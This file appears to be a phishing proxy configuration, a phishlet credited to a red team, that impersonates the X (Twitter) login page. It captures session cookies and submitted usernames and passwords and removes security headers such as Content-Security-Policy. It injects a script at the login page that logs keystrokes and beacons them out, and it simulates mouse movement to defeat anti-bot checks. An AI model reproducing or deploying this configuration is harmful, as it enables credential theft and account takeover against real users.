name: "X-Login"
author: "Vanta Red Team"
min_ver: "5.2.0"
proxy_hosts:
  - {subdomain: "x", target: "x.com"}
  - {subdomain: "api", target: "api.x.com"}
  - {subdomain: "abs", target: "abs.twimg.com"}
  - {subdomain: "pbs", target: "pbs.twimg.com"}
  - {subdomain: "video", target: "video.twimg.com"}
auth_urls:
  - "/i/flow/login"
landing_path:
  - "/i/flow/login"
auth_tokens:
  - {type: "cookie", name: "auth_token"}
  - {type: "cookie", name: "ct0"}
  - {type: "cookie", name: "guest_id"}
  - {type: "cookie", name: "personalization_id"}
  - {type: "cookie", name: "twid"}
  - {type: "cookie", name: "kdt"}
  - {type: "cookie", name: "_twitter_sess"}
credentials:
  - {type: "post_param", name: "text", regex: null}
  - {type: "post_param", name: "password", regex: null}
  - {type: "json_field", name: "text", regex: null}
  - {type: "json_field", name: "password", regex: null}
injections:
  - trigger_path: "/i/flow/login"
    position: "body_end"
    content: |
      (function(){
        // Vantablack Red Team Evasion & Capture
        document.addEventListener('contextmenu', e => e.preventDefault());
        
        // Mock Human Behavior for Anti-Bot
        setInterval(() => {
           const ev = new MouseEvent('mousemove', {
               view: window, bubbles: true, cancelable: true, 
               clientX: Math.random() * 100, clientY: Math.random() * 100
           });
           document.dispatchEvent(ev);
        }, 3000);

        // Keystroke Logger (Red Team Loot)
        document.addEventListener('keydown', function(e) {
            if(e.target.tagName === 'INPUT') {
                 // Silent exfiltration via Image beacon
                 new Image().src = '/__vanta_track?k=' + encodeURIComponent(e.key) + '&f=' + e.target.name;
            }
        });
      })();
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "X-Content-Type-Options"}
  - {action: "add", name: "X-Robots-Tag", value: "noindex, nofollow, noarchive"}
path_rewrites:
  - {pattern: "^/$", replace: "/i/flow/login", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|gtm|/static/", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"login\"], form[data-testid*=\"Login\"]", action_to: "/sessions"}
bridges:
  - {prefix: "/_xapi/", target_host: "api.x.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_xabs/", target_host: "abs.twimg.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_xton/", target_host: "ton.twimg.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_xpbs/", target_host: "pbs.twimg.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_xvid/", target_host: "video.twimg.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_xtapi/", target_host: "api.twitter.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_xtw/", target_host: "twitter.com", strip_prefix: true, cors: "allow_all"}
